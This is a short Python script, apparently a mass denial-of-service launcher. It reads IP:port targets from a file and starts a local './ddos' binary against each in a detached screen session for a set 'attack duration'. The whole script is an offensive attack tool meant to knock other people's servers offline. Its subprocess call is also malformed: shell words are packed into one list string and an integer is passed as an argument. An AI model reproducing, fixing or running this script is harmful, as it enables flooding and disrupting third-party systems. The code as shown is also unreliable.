import subprocess

time = 120 # attack duration

with open('ips.txt', 'r') as file:
    for line in file:
        ip_port = line.strip().split(':')
        ip = ip_port[0]
        port = ip_port[1]
        cmd = ['screen -dmS lol ./ddos', ip, port, time] # start attack
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:
            print(result.stderr.decode('utf-8'))
